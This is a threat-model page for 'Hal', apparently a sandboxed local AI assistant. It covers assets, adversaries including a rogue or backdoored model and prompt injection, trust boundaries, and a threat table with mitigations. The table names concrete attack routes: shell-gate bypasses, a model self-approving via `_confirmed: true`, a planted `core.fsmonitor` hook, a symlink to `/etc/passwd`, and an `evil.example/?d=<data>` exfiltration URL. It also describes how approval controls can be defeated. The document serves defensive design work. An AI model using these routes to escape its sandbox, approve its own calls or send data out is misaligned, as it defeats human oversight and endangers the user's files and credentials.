# Threat model

What Hal protects, from whom, where the trust boundaries run, the threats against each
boundary with their mitigations, and the risks Hal documents rather than hides. This page is
for developers and reviewers; the requirement ids (`REQ-SEC-nn`) and the mechanisms behind
each mitigation are in [01-security](../design/01-security.md), which is authoritative when the
two differ. User-facing advice on profiles and approvals belongs in the user security guide.

Ids: assets `AS`, adversaries `ADV`, trust boundaries `TB`, threats `T`. Attack cases
(`ATK-nn`) that test these threats are listed in 01-security, "Attack cases".

## Assets

| Id | Asset | Where it lives |
| --- | --- | --- |
| AS1 | The user's files: repos, documents, the Obsidian vault | `$HOME` |
| AS2 | Credentials: SSH and GPG keys, app passwords, API and bot tokens, browser profiles, keyrings, the gateway and console tokens | `~/.ssh`, `~/.gnupg`, `~/.config/*`, `~/.local/share/keyrings`, `config_dir()` |
| AS3 | Personal data in Hal stores: memory notes, calendar, contacts, ledger, habits, mail | pack stores under `data_dir()`, the vault, IMAP |
| AS4 | Host integrity: no persistence, no privilege gain, no planted code that the user later runs | host filesystem, shell rc files, git hooks, units |
| AS5 | The user's outbound identity: mail, SMS, Telegram, GitHub (`gh` token), push topics | pack secrets |
| AS6 | Availability: GPU, CPU, RAM, disk; other GPU users (hal-employment, batchjob) | the machine |
| AS7 | The user's attention: approvals must stay rare enough to be read | the TUI and channels |
| AS8 | Integrity of Hal itself: config, policy, approvals, audit log, packs, models | `config_dir()`, `state_dir()`, `data_dir()` |

## Adversaries

| Id | Adversary | Capabilities assumed |
| --- | --- | --- |
| ADV1 | Rogue or backdoored model | Emits any token sequence, including well-formed tool calls, fake tool results, fake approval text and terminal escapes. Adaptive within a session. Knows Hal's design (it is public). Has a full shell inside the box. |
| ADV2 | Prompt injection through tool results | Controls text that reaches the model: mail, web pages, feeds, files and repos in the workspace, screen text, clipboard, phone notifications, MCP server output. Cannot call tools directly; steers the model. |
| ADV3 | Malicious model file | A GGUF or safetensors file, a chat template, or a pickle that targets the loader (CVE-2025-53630, CVE-2026-33298 in GGUF parsing; CVE-2024-34359 template RCE; pickle RCE) [source: understand/research-sandbox.md section 6]. |
| ADV4 | Malicious or compromised pack | Arbitrary Python that the user installed; can mislabel its tools' tiers; can run code at install. |
| ADV5 | Network attacker | On the LAN or path: tampers with downloads, DNS, plaintext HTTP. |
| ADV6 | Other local user | Non-root account on the same machine: can connect to loopback TCP ports, read world-readable files, race in shared `/tmp`. |
| ADV7 | Malicious web page in the user's browser | Sends cross-origin requests to `127.0.0.1` ports (simple requests need no preflight), and DNS rebinding to read responses. |

Out of scope: root, the kernel, the Docker daemon, the GPU driver, physical access, and the
user deliberately loosening policy.

## Trust boundaries

```text
 +----------------------------- HOST (trusted: the user's uid, TCB) -------------------------------+
 |                                                                                                 |
 |  user <-> hal TUI / console / hal acp proxy <-> editors, hal-voice, hal-telegram (ACP clients)  |
 |           hal approve (terminal)  /  desktop notification        (approval surfaces, TB5)       |
 |                 |  host-originated requests, every argument rendered by the host                |
 |                 v                                                                               |
 |  broker (halsandbox) and hal-hub mcp: policy (halhub.policy) + approvals (halhub.approvals)     |
 |     + audit + guard client (halhub.guard) + reviewer (halhub.reviewer)                          |
 |     |  TB3: allow only after decide(); secrets injected here, never beyond                      |
 |     v                                                                                           |
 |  hub runner -> pack tool process (per call, own secrets only, bwrap --unshare-net if !network)  |
 |     |  TB6: egress helper, domain allowlist, pinned IPs                    ---> internet (ADV5) |
 |  egress proxy (registry allowlist) <--- dependency prep box (02)       ---> package registries  |
 |                                                                                                 |
 |  gateway (token) --TB4--> llama-server (unix socket or 127.0.0.1 + api key) / Ollama            |
 |     ^                        |  TB1: parses model files (ADV3); never executes model actions    |
 |     |                        +--> GPU (optional GPU container, runtime nvidia)                  |
 |  model forwarder (adds session token, route allowlist)                                          |
 |     ^                                                                                           |
 |  guard worker (own sandbox, no network, safetensors only)                                       |
 |                                                                                                 |
 |  127.0.0.1 listeners (token + Host + Origin): console 8740,     <--TB7-- browser (ADV7)         |
 |  gateway 8741 (off by default), hub HTTP 8742                   <--TB7-- other users (ADV6)     |
 +-----------^------------------------^------------------------------------------------------------+
             | /run/hal/broker.sock   | /run/hal/model.sock            (TB2: the only exits)
 +-----------+------------------------+------------------- BOX (untrusted: ADV1, ADV2) ------------+
 |  hal-agent or third-party CLI, coding tools, bash      --network none, ro rootfs, no caps       |
 |  /work (rw, masked secrets)  /work/.git (ro)  /run/hal (sockets, ro)  tmpfs                     |
 +-------------------------------------------------------------------------------------------------+
```

Boundaries:

- **TB1 model file -> inference process.** Parsing is the only attack surface; the process
  holds no secrets and runs no model-chosen action.
- **TB2 box -> host.** Two unix sockets. Everything crossing is untrusted input to the broker
  and the forwarder.
- **TB3 broker decision -> tool execution.** Nothing runs on the host unless `decide` says
  `allow` or a human, or a reviewer for a reviewable call, approved its exact key.
- **TB4 gateway -> inference servers.** Authenticated; inference servers are not reachable
  from the box except through the forwarder's path allowlist.
- **TB5 human -> approval.** Only approval surfaces create grants.
- **TB6 tool -> internet.** Only tools with `network = true`, only to allowed hosts.
- **TB7 other principals -> Hal listeners.** Tokens, Host and Origin checks, file modes.

## Threat table

| Id | Threat | Adversary | Entry point | Mitigations | Residual risk |
| --- | --- | --- | --- | --- | --- |
| T01 | Model runs arbitrary host commands | ADV1, ADV2 | Host shell tool (today's `shell_look` gate bypasses: newline, lone `&`, `<( )`, `sed e` verified executing; `exiftool`, `tar --checkpoint-action`, `git grep -O` by reading) [verified: understand/ext-b.md section 2] | Bash runs only in the box (02); host `runs_code` tools deny by default and argv-only (REQ-SEC-55, 59); `shell_look` rewritten as an argv allowlist with no shell, plus the hard-deny paths and the active-workspace exclusion (C5, 08 REQ-PACK-20 to 22); no `allow_host_run` (REQ-SEC-95) | User enabling a host shell tool by name accepts per-call approval risk; a program on `shell_look`'s table with an unknown dangerous option (ATK-01 probes guard the known ones) |
| T02 | Model approves its own call | ADV1, ADV2 | `_confirmed: true` over MCP ran a confirm tool immediately [verified: understand/hal-hub-eco.md section 3]; `brain.py` adds `_confirmed` to the schema the model sees (`halcore/brain.py:157-166`) | Stripping and audit (REQ-SEC-06); approvals only from surfaces answering host-rendered requests (REQ-SEC-22); no yes-matcher or any approval parsed from text (B5); control socket refuses `HAL_HARNESS` peers (REQ-SEC-26) | A same-uid host harness can still approve (residual risk 12) |
| T03 | Approval for one call reused for another | ADV1 | Today's gate is keyed by tool name for the next turn (`halcore/brain.py:190-195`) [verified: understand/critic.md V1] | sha256 key over canonical args (REQ-SEC-19, 20); scopes `once` and `session` only (REQ-SEC-21) | A `session` grant covers repeats of the same exact call in that session |
| T04 | Routines launder confirmation | ADV1, ADV2 | `halroutines/tools.py:39` always sends `_confirmed: True`; a saved scene can hold `shell_run`, `mail_send`, `power_shutdown` | Saving a routine is `act`; one routine grant bound to the exact step list and its hash; uncovered steps skipped and notified (REQ-SEC-31) | The user approves a routine without reading every step |
| T05 | Injection via mail, web, feeds, files drives egress | ADV2 | `untrusted_output` tools | In the shipped `default` profile with the guard off, the defence is the `ask` on `act` and `send` plus the domain allowlist (REQ-SEC-10); `write` tools stay allowed. When the guard is on: taint and fresh decisions on flagged turns (REQ-SEC-32 to 35). Always: the envelope (REQ-SEC-96, a hint only); the reviewer never sees tool output (REQ-SEC-37) | Novel injections the guard misses; data sent through an allowlisted domain, a fixed-destination send (residual risk 9) or an approved send; injected text stored by `write` tools (residual risk 10) |
| T06 | Exfiltration from the box | ADV1 | Network, DNS, sockets | `--network none` (REQ-SEC-60) [verified: wget to 1.1.1.1 got "Network unreachable"]; only two sockets; forwarder path allowlist (REQ-SEC-66) | Data encoded into arguments of an approved or allowed broker call; covert timing on the model socket |
| T07 | Credential theft | ADV1, ADV4 | Host files, environment | Nothing of `$HOME` mounted (REQ-SEC-61); env allowlist (REQ-SEC-63) [verified: container env had only `HOME`, `HOSTNAME`, `PATH`, `PWD`, `SHLVL`]; path hard-deny for host tools (REQ-SEC-09); secrets via stdin envelope per pack (REQ-SEC-50) | A malicious pack reads files as the user (it is code the user installed) |
| T08 | Persistence via `.git/hooks` or git config | ADV1 | `/work/.git` | `.git` ro [verified: write gave EROFS; `rmdir` and `mv` of the mount point gave "Resource busy"] (REQ-SEC-61); host git with hooks and fsmonitor off (REQ-SEC-67) | Nested repos (below) |
| T09 | Nested repo with `core.fsmonitor` runs code on the host | ADV1 | Model runs `git init sub` in `/work` and sets `core.fsmonitor` | Host git never runs inside `sub` (REQ-SEC-67) [verified: `git -C sub status` ran the planted command; explicit `--git-dir/--work-tree` with fsmonitor off did not]; workspace scan flags new `.git` (REQ-SEC-70) | The user's shell prompt or editor git integration entering `sub` runs it; documented |
| T10 | Planted files the user later runs (Makefile, `.envrc`, `.vscode/tasks.json`, `package.json` scripts, CI workflows) | ADV1, ADV2 | `/work` | Checkpoints, `/diff`, review mode, `--isolated`, workspace scan (REQ-SEC-70) | Residual by design (brief); the user must review |
| T11 | Symlink escape: host code follows a link planted in `/work` | ADV1 | `ln -s /etc/passwd /work/evil` [verified: link created from the box, visible on the host] | Host tools never touch workspace paths (REQ-SEC-09); `open_beneath` for previews (REQ-SEC-68); `git apply` refuses beyond-symlink writes [verified]; symlink review on apply (REQ-SEC-69) | A user who opens the link in their own editor reads the target |
| T12 | Path traversal in host tool arguments | ADV1, ADV2 | `files_read` reads any path today (`hal-files` `tools.py:114-135`) | Resolve, roots, hard-deny (REQ-SEC-09) | Files inside read roots are readable without asking (by design) |
| T13 | SSRF to local services, `file://` read | ADV1, ADV2 | `feeds_save('file://...')` returned local file content [verified: understand/ext-b.md section 3] | URL rules (REQ-SEC-10, 11) | None known for Hal's egress helper; packs that bypass it (ADV4) |
| T14 | CSRF or DNS rebinding against the console | ADV7 | `console.py` `do_POST` parses any body, no auth, no Origin check [source: understand/hal-core.md section 3, not exercised] | REQ-SEC-71, REQ-SYS-10 | None known |
| T15 | Browser page drives llama-server | ADV7 | llama-server defaults to `--cors-origins *` and echoes the Origin with credentials [verified: `llama-server --help`, b11512] | Unix socket or API key (REQ-SEC-76) | Inference servers the user starts outside Hal |
| T16 | Browser page drives Ollama | ADV7 | Ollama on 127.0.0.1:11434 | Ollama 0.40.1 answers 403 to a foreign `Origin` and a foreign `Host` [verified: curl with `Origin: https://evil.example` and `Host: evil.example`] | Depends on Ollama keeping this check |
| T17 | Other local user uses Hal endpoints | ADV6 | Loopback TCP | Tokens (REQ-SYS-10); unix sockets in 0700 dirs (REQ-SYS-11); files 0600 | Ollama has no auth: any local user can use it and pull or delete models |
| T18 | Inference server enables its own agent tools | ADV1 via config, ADV4 | llama-server `--tools` (`exec_shell_command`, `write_file`), `--agent`, `--mcp-servers-*`, or `LLAMA_ARG_TOOLS` in env [verified: `llama-server --help`] | Flag denylist and env allowlist (REQ-SEC-76) | None known |
| T19 | Malicious model file exploits the parser | ADV3 | GGUF, template, pickle | sha256 manifest (REQ-SEC-79); no pickle (REQ-SEC-80); llama.cpp template engine (REQ-SEC-81); pinned recent llama.cpp (REQ-SEC-78); inference server holds no secrets; optional GPU container (05) | A GPU driver ioctl bug is reachable from the inference process even in a container |
| T20 | Malicious pack | ADV4 | `hal packs add` install argv runs with no confirmation, timeout or exit check today (`halcore/ext.py:75-81`) | Install review and typed confirmation, pinned commit (REQ-SEC-84, 85); no import at discovery (REQ-SEC-57); per-call processes, own secrets only, no network unless declared (REQ-SEC-50, 58) | Pack code is trusted once installed; tier labels are self-declared; a pack on the host can use the docker group to become root |
| T21 | Docker group is root-equivalent | ADV4, any same-uid code | The user is in group `docker` [verified: `id`] | Documented; rootless Docker recommended as an option (`docs/user/security.md`) | Any same-uid process can start a privileged container |
| T22 | Approval prompt spoofing | ADV1 | Arguments with ANSI escapes, bidi controls, look-alike hosts, very long strings | Host-rendered, escaped display (REQ-SEC-25); punycode; truncation with view-all | A user who approves without reading |
| T23 | Terminal or clipboard injection through model text | ADV1, ADV2 | OSC 52 clipboard write, OSC 8 links, CSI sequences | Escape filtering (REQ-SEC-72) | Third-party editors (Zed) render their own way |
| T24 | Approval fatigue | ADV1 (spam), design | Many `ask` prompts | `write` allowed and logged; reversible `act` allowed in `default`; three fixed-destination `send` tools allowed by name (C4); `url:from-search` (REQ-SEC-92); domain and argument allowlists; `session` scope; batch panel for several pending requests (06); ask budget (REQ-SEC-12); prompt budget test (REQ-SEC-91); the reviewer only when the user enables it (off by default) | Users who switch to `trusted`; prompts on `hal box` sessions cost more, because the only surfaces are `hal approve` and notifications |
| T25 | Resource exhaustion | ADV1 | Fork bombs, memory, disk, GPU | pids/memory/cpu limits (REQ-SEC-60); tmpfs sizes (02); broker limits (REQ-SEC-65); rate limits | Disk use inside `/work`; GPU time through the model socket |
| T26 | Audit tampering | ADV1 | Audit files | Not mounted in the box; 0600 | Same-uid host code can edit it (TCB) |
| T27 | Secrets leak through tool output or logs | ADV1, ADV2 | A tool echoes a token; nested `opts.password` and `body="token=abc"` logged in clear today [verified: understand/hal-hub-eco.md section 3] | Exact-value scrub (REQ-SEC-51); recursive redaction (REQ-SEC-45, 46) | Secrets the host does not know about (typed by the user into a message) |
| T28 | Cloud exfiltration through `deep_work` | ADV2 | `brain.py:203-227` runs `claude -p` with acceptEdits on the user's cloud login, offered every turn | The cloud variant of `core_long_task` is `send`, off by default (REQ-SEC-54); the local `core_long_task` is `act` and runs a sandboxed `hal -p` | User opt-in |
| T29 | Malicious dependency install script | ADV1 (edits `package.json` scripts, `setup.py`, `build.rs` or the lockfile), ADV2 (a poisoned or typosquatted package in a lockfile) | `hal code --deps` runs `uv sync`, `npm ci`, `cargo fetch` | Prep box with no secrets, egress only to registry download hosts, writes only inside the workspace; no scripts or builds by default and only manifests and lockfile mounted; scripts need `--allow-scripts` and their own approval; approval bound to the lockfile and every manifest's sha256 with a package diff (REQ-SEC-97) | With `--allow-scripts`, install code can push data it can see to a registry write API on an allowed host; installed code runs later in the code box and can plant files in the workspace (residual risk 1) |
| T30 | Zero-click render exfiltration | ADV1, ADV2 | Assistant text with `https://evil.example/?d=<data>` rendered by a client that fetches previews or images | No Hal UI fetches model-named URLs; Telegram link previews disabled; console CSP (REQ-SEC-73) | ACP editors that load Markdown images (residual risk 11) |
| T31 | Injection persistence | ADV2 | An injected turn calls `memory_remember`, `tasks_add` or `calendar_add` (tier `write`, allowed) | Reads of those stores are `untrusted_output` (08), so later sessions get the envelope and taint | With the guard off taint changes no verdict (residual risk 10) |

## Residual risks (documented, not hidden)

1. Files the model writes into the workspace can later run as the user: build files, scripts,
   `.envrc`, editor tasks, CI workflows, nested git repos with `core.fsmonitor` or hooks,
   agent instruction files and host harness hooks (`AGENTS.md`, `.claude/settings.json`). The
   mitigations are review mode, `/diff`, `--isolated` and the workspace scan.
2. Allowed egress domains and approved `send` calls can carry exfiltrated data, encoded in
   any argument. In the shipped `default` profile the guard is off, so taint changes no
   verdict and the defence against injection is the `ask` on `act` and `send` plus the
   domain allowlist; the guard, when enabled, reduces this but does not prevent it.
3. A GPU driver ioctl bug is reachable from any process that uses the GPU, containerised or
   not. GPU containers use the `nvidia` runtime (runc-based) because `runsc-gpu` fails to
   start a sandbox on this machine [verified: brief "Host facts", 2026-10-23], so gVisor's
   `nvproxy` narrowing is not in use; even `nvproxy` does not validate DMA [source:
   understand/research-sandbox.md section 2].
4. Membership of the `docker` group is equivalent to root on the host. Rootless Docker is
   the documented alternative.
5. The box shares the host kernel when the runtime is runc. gVisor `runsc` is installed
   (release-20261019.0) and is used when 02's probe succeeds, which needs runsc registered
   with `--host-uds=open` for the bind-mounted sockets [verified: brief "Host facts",
   2026-10-23: refused without it]. Until the user registers it, boxes run on runc and the
   status line says so.
6. Pack code is trusted once installed; its tier labels are claims, not proofs.
7. Ollama has no authentication; any local user can use it.
8. The guard is a classifier: it misses some injections and flags some benign text.
9. Zero-prompt egress (R-new-1): the `send` tools allowed by name in `default`
   (`notify_send`, `briefing_deliver`, `calendar_sync`), network `read` tools with fixed
   services (`web_search`, `web_news`, `web_wikipedia`, `web_weather`, `dev_github`), and the
   reversible `media_youtube` and `mail_draft` (the user's own Drafts folder) carry
   model-chosen text to fixed destinations without a prompt. Tools
   that take a model-chosen host (`format = "host"` or `"url"`) ask for unlisted hosts
   (REQ-SEC-10), so they are not in this group. `url:from-search` lets `web_read` fetch a
   URL from search results without a prompt; the model's choice among about 10 results leaks
   about 3 bits per pick, bounded by rate limits.
10. Injection persistence (R-new-3): `write` tools (memory notes, tasks, calendar, contacts)
    store attacker text without a prompt, and later sessions read it back. The reads are
    `untrusted_output`, but with the guard off taint is inert.
11. Zero-click render exfiltration (R-new-2): ACP editors may load Markdown images or link
    previews from assistant text [unverified per editor]. Hal's own UIs and Telegram do not.
12. Same-uid host processes can approve (R-new-4): `hal connect` and `hal claude` harnesses
    have a host shell and can reach the control socket or a terminal. Under those harnesses
    approvals, including MCP elicitation answers, are advisory; `HAL_HARNESS` checks are
    speed bumps that `script` or a cleared environment defeat.
13. `/undo` does not cover ignored files or files over 02's checkpoint size cap (R-new-5). In
    the box the model can delete local databases and data folders beyond recovery; `/undo`
    names them (REQ-SEC-70).
14. Secrets inside the workspace (R-new-6) other than the `[sandbox].mask` patterns are
    readable by the model, and `--unmask` exposes the masked ones. Host hard-deny paths do
    not apply inside the box.
15. Approval surfaces a person may not be behind (R-new-7): ACP editors with auto-approve
    settings [unverified for Zed], and voice, where audio played by a web page or another
    person can speak. Voice is limited to `once`, non-`system`, non-content calls whose display
    fits in 300 characters, needs the spoken two-digit challenge, pauses media while pending,
    and never resets a `flagged` session (REQ-SEC-94, REQ-SEC-32); a person in the room who
    hears the challenge can still answer.
16. Backend `none` (R-new-8): the agent runs on the host with path checks only; bash is
    disabled and only `host = true` MCP servers start (REQ-SEC-95), but a bug in the agent's
    path confinement is a host bug.
17. The unboxed assistant fallback (R-new-9): with no container backend, the assistant agent
    parses model output in the `hal` process, with the same broker and policy and a visible
    "unboxed" banner (A1).

